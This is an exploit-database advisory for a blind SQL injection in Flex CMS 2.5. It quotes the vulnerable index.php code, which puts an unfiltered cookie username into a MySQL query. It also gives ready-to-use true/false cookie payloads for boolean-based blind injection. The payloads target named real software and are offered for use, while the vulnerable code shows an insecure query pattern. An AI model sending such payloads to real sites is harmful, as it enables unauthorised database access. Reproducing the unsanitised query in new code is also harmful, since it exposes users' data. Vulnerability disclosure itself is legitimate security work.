Flex CMS <= 2.5 (index.php)Blind SQL Injection Vulnerability
============================================================

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1

#[+] Discovered By   : Inj3ct0r
#[+] Site            : Inj3ct0r.com
#[+] Support e-mail  : submit[at]inj3ct0r.com


Site product: www.flexcms.com
Version: 2.5
Requirements: magic_quotes_gpc = off

Vulnerability file (index.php) :


$CookieData = $HTTP_COOKIE_VARS[$CookieName]; 

$LoggedIn = &#039;n&#039;; 
$UserLevel = 0; 
  
if ($CookieData != &#039;&#039; && $CookieData != &#039;not_logged_in&#039;) { 
    list ($CookieUsername, $CookiePassword) = split(&#039;==&#039;, $CookieData, 2); 
    if ($CookieUsername != &#039;&#039; && $CookiePassword != &#039;&#039;) { 
        $query = "select RecordNumber,Level,Password,DisplayName,SessionLen  gth from `".$Settings[&#039;DBPrefix&#039;]."core-Users` where Username=&#039;$CookieUsername&#039; LIMIT 1"; 
        $result = mysql_query($query) or die (mysql_error()); 


In the cookies sent login and pass, in such a
login == hash_pass
Because the variable $ CookieUsername not filtered and if magic_quotes_gpc = off is the opportunity to inj3ct0r


Example:


True: FCLoginData12345=qwerty&#039;+and+1=1/*%3D%3DqwDyM1dbqwDyM1db9iOPI
False: FCLoginData12345=qwerty&#039;+and+1=2/*%3D%3DqwDyM1dbqwDyM1db9iOPI 


---------------------------------



